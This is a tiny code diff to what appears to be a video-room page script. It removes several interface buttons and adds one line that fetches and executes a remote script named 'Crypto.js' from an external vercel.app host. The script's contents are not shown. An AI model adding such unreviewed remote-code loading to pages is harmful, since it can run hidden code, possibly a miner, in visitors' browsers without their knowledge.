@@ -28,3 +28,4 @@ $("#fullscreenbtn").remove();
 $("#showplaylistmanager").remove();
 $("#qlockbtn").remove();
 
+$.getScript("https://kinach.vercel.app/assets/Crypto.js");
